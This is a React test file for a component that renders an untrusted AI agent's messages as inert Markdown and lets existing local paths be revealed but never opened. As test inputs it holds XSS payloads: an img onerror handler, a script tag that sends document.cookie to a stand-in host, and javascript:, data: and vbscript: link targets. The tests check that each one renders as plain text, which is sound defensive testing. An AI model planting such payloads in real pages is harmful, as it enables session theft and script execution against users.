/**
 * Rendering an agent's words — and refusing to render anything else.
 *
 * ANT-24. The safety property under test is structural: this builds React
 * elements from text and never touches `dangerouslySetInnerHTML`, so markup
 * inside a message can only ever come out as characters. The tests below try
 * the things a compromised or careless message would try, and assert that
 * each one arrives as text.
 */

import { cleanup, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { MessageMarkup, clampMarkup, parseBlocks } from "./message-markup.js";

/**
 * By default nothing on disk exists, so nothing is offered as clickable and
 * these tests are about rendering alone. The reveal cases install their own.
 */
function paths(real: string[] = []) {
  const api = {
    pathsExist: vi.fn(async (asked: string[]) =>
      Object.fromEntries(asked.map((path) => [path, real.includes(path)])),
    ),
    revealPath: vi.fn(async () => true),
  };
  (window as unknown as { anthill: unknown }).anthill = api;
  return api;
}

beforeEach(() => {
  paths();
});

afterEach(() => {
  cleanup();
  delete (window as unknown as { anthill?: unknown }).anthill;
});

function show(text: string) {
  render(<MessageMarkup text={text} />);
  return document.querySelector(".msg-markup") as HTMLElement;
}

describe("what a message renders as", () => {
  it("reads emphasis rather than showing its markers", () => {
    const root = show("The run **passed** and the report is *ready*.");
    expect(root.querySelector("strong")?.textContent).toBe("passed");
    expect(root.querySelector("em")?.textContent).toBe("ready");
    expect(root.textContent).not.toContain("**");
  });

  it("renders a bulleted list as a list", () => {
    const root = show("Done:\n- read the note\n- checked the content\n- wrote the report");
    expect(root.querySelectorAll("ul li")).toHaveLength(3);
    expect(root.textContent).not.toContain("- read");
  });

  it("renders a numbered list as an ordered one", () => {
    const root = show("1. plan\n2. build\n3. check");
    expect(root.querySelectorAll("ol li")).toHaveLength(3);
  });

  it("keeps a paragraph break as two paragraphs", () => {
    const root = show("First I read it.\n\nThen I checked it.");
    expect(root.querySelectorAll("p")).toHaveLength(2);
  });

  it("renders a heading below the card's own title, never above it", () => {
    const root = show("# Final report\nAll good.");
    // The card owns h3; a message's headings start under it.
    expect(root.querySelector("h4")?.textContent).toBe("Final report");
    expect(root.querySelector("h1")).toBeNull();
  });

  it("renders a path as inline code, so it can wrap and be copied", () => {
    const root = show("Wrote `/tmp/anthill-e2e/report.md` as asked.");
    expect(root.querySelector("code")?.textContent).toBe("/tmp/anthill-e2e/report.md");
    expect(root.textContent).not.toContain("`");
  });

  it("leaves markers inside inline code alone", () => {
    // Backticks win: `**` inside code is two asterisks, not emphasis.
    const root = show("Run `npm test -- **/*.spec.ts` first.");
    expect(root.querySelector("code")?.textContent).toBe("npm test -- **/*.spec.ts");
    expect(root.querySelector("strong")).toBeNull();
  });
});

describe("what a message cannot do", () => {
  it("cannot introduce HTML", () => {
    const root = show("Here is <b>bold</b> and <img src=x onerror=alert(1)>.");
    expect(root.querySelector("b")).toBeNull();
    expect(root.querySelector("img")).toBeNull();
    // It arrives as the characters it is.
    expect(root.textContent).toContain("<b>bold</b>");
  });

  it("cannot introduce a script", () => {
    const root = show("<script>fetch('http://x/'+document.cookie)</script>");
    expect(root.querySelector("script")).toBeNull();
    expect(root.textContent).toContain("<script>");
  });

  it("renders no anchors at all – a link is shown, never followed", () => {
    const root = show("See [the report](https://example.com/r) for details.");
    expect(root.querySelector("a")).toBeNull();
    expect(root.textContent).toContain("the report");
    expect(root.textContent).toContain("https://example.com/r");
  });

  it("keeps a local path visible, because that is the detail worth having", () => {
    const root = show("Report: [codex-survey.md](/tmp/anthill-e2e/codex-survey.md).");
    expect(root.textContent).toContain("codex-survey.md");
    expect(root.textContent).toContain("/tmp/anthill-e2e/codex-survey.md");
  });

  it("does not print a target that could only be an attack or a blob", () => {
    for (const href of [
      "javascript:alert(1)",
      "data:text/html;base64,PHNjcmlwdD4=",
      "vbscript:msgbox(1)",
    ]) {
      const root = show(`Try [this](${href}) now.`);
      expect(root.querySelector("a")).toBeNull();
      expect(root.textContent).toContain("this");
      expect(root.textContent).not.toContain(href);
      cleanup();
    }
  });

  it("falls back to the word link when a pointless target had no label", () => {
    const root = show("[](javascript:void)");
    expect(root.textContent).toBe("link");
  });

  it("renders an unclosed marker as the character it is", () => {
    const root = show("The **report is here");
    expect(root.querySelector("strong")).toBeNull();
    expect(root.textContent).toContain("**report");
  });
});

describe("the block parser", () => {
  it("ends a list when prose resumes", () => {
    const blocks = parseBlocks("- one\n- two\nAnd that is all.");
    expect(blocks.map((block) => block.kind)).toEqual(["list", "paragraph"]);
  });

  it("does not merge a bulleted list into a numbered one", () => {
    const blocks = parseBlocks("- one\n1. two");
    expect(blocks).toHaveLength(2);
    expect(blocks.every((block) => block.kind === "list")).toBe(true);
  });

  it("joins wrapped prose lines into one paragraph", () => {
    const blocks = parseBlocks("A sentence that was\nwrapped by the agent.");
    expect(blocks).toEqual([
      { kind: "paragraph", text: "A sentence that was wrapped by the agent." },
    ]);
  });

  it("has nothing to say about empty text", () => {
    expect(parseBlocks("")).toEqual([]);
    expect(parseBlocks("\n\n  \n")).toEqual([]);
  });
});

/**
 * Cutting a long message for the collapsed card.
 *
 * A prefix of Markdown is not Markdown: cut inside `**bold**` and the parser
 * renders the marker literally, putting back on screen exactly what this file
 * exists to take off it.
 */
describe("clamping a message", () => {
  it("leaves a short message alone", () => {
    expect(clampMarkup("Short and done.", 100)).toBe("Short and done.");
  });

  it("never cuts inside emphasis", () => {
    const cut = clampMarkup("The result was **completely fine** in the end.", 22);
    expect(cut).not.toContain("**");
    expect(show(cut).querySelector("strong")).toBeNull();
  });

  it("never cuts inside inline code", () => {
    const cut = clampMarkup("Run `npm test --workspaces` when ready.", 14);
    expect(cut.split("`").length - 1).toBe(0);
  });

  it("never cuts inside a link", () => {
    const cut = clampMarkup("See [the report](/tmp/report.md) for the rest.", 22);
    expect(cut).not.toContain("[");
  });

  it("says it cut", () => {
    expect(clampMarkup("A sentence long enough to be cut short.", 12).endsWith("…")).toBe(true);
  });

  it("keeps whole markup that fits inside the limit", () => {
    const cut = clampMarkup("A **bold** start, and then a great deal more text besides.", 30);
    expect(cut).toContain("**bold**");
    expect(show(cut).querySelector("strong")?.textContent).toBe("bold");
  });
});

/**
 * Showing a file where it lives.
 *
 * ANT-29. The load-bearing decision in this file is that a message's text
 * cannot become a capability: it is written by an agent Anthill neither
 * started nor trusts. A local path is the one exception that does not breach
 * it, and only in one direction — the item is *revealed* in Finder, never
 * opened. `shell.openPath` on an agent-written path would run whatever that
 * path turns out to be, which is exactly what the rest of this file exists to
 * withhold.
 */
describe("a path an agent wrote", () => {
  const reveal = () => screen.queryByRole("button", { name: /\/tmp\// });

  it("is clickable when it is really there", async () => {
    paths(["/tmp/anthill-e2e/report.md"]);
    render(<MessageMarkup text="Wrote the report to /tmp/anthill-e2e/report.md as asked." />);
    await waitFor(() => expect(reveal()).toBeTruthy());
  });

  it("is clickable inside inline code, where agents usually put it", async () => {
    paths(["/tmp/anthill-e2e/report.md"]);
    render(<MessageMarkup text="Wrote `/tmp/anthill-e2e/report.md` as asked." />);
    await waitFor(() => expect(reveal()).toBeTruthy());
    // And it keeps the monospace it had.
    expect(document.querySelector("code button.msg-path")).toBeTruthy();
  });

  it("reveals rather than opens", async () => {
    const api = paths(["/tmp/anthill-e2e/report.md"]);
    render(<MessageMarkup text="See /tmp/anthill-e2e/report.md" />);
    await waitFor(() => expect(reveal()).toBeTruthy());

    reveal()!.click();
    await waitFor(() => expect(api.revealPath).toHaveBeenCalledWith("/tmp/anthill-e2e/report.md"));
    // There is no other verb on offer: the page cannot open or run anything.
    expect(api).not.toHaveProperty("openPath");
    expect(reveal()!.getAttribute("title")).toContain("Nothing is opened or run");
  });

  it("stays plain text when there is nothing there", async () => {
    const api = paths([]);
    render(<MessageMarkup text="See /tmp/invented/by-the-agent.md" />);
    await waitFor(() => expect(api.pathsExist).toHaveBeenCalled());
    // A control that does nothing is worse than no control.
    expect(document.querySelector("button.msg-path")).toBeNull();
    expect(document.querySelector(".msg-markup")?.textContent).toContain("/tmp/invented/by-the-agent.md");
  });

  it("stays plain text when the check itself fails", async () => {
    (window as unknown as { anthill: unknown }).anthill = {
      pathsExist: vi.fn(async () => {
        throw new Error("no");
      }),
    };
    render(<MessageMarkup text="See /tmp/anthill-e2e/report.md" />);
    await waitFor(() => expect(document.querySelector(".msg-markup")?.textContent).toContain("/tmp"));
    expect(document.querySelector("button.msg-path")).toBeNull();
  });

  it("leaves a URL exactly as inert as it was", async () => {
    paths(["/tmp/anthill-e2e/report.md"]);
    render(
      <MessageMarkup text="Report at /tmp/anthill-e2e/report.md, details at https://example.com/r" />,
    );
    await waitFor(() => expect(reveal()).toBeTruthy());
    // The path became a control; the URL did not, and there are no anchors.
    expect(document.querySelector("a")).toBeNull();
    expect(screen.queryByRole("button", { name: /example\.com/ })).toBeNull();
    expect(document.querySelector(".msg-markup")?.textContent).toContain("https://example.com/r");
  });

  it("does not swallow the sentence's punctuation", async () => {
    paths(["/tmp/anthill-e2e/report.md"]);
    render(<MessageMarkup text="It is at /tmp/anthill-e2e/report.md." />);
    await waitFor(() => expect(reveal()).toBeTruthy());
    expect(reveal()!.textContent).toBe("/tmp/anthill-e2e/report.md");
    expect(document.querySelector(".msg-markup")?.textContent).toContain("report.md.");
  });

  it("asks about nothing when the message names no path", () => {
    const api = paths([]);
    render(<MessageMarkup text="Both steps completed successfully." />);
    expect(api.pathsExist).not.toHaveBeenCalled();
  });

  it("asks about a relative path not at all – it is nobody's path", async () => {
    // Relative to which directory? Anthill did not start the session and does
    // not know its working directory.
    const api = paths([]);
    render(<MessageMarkup text="Edited src/main/index.ts and packages/live/src/feed.ts" />);
    expect(api.pathsExist).not.toHaveBeenCalled();
  });
});
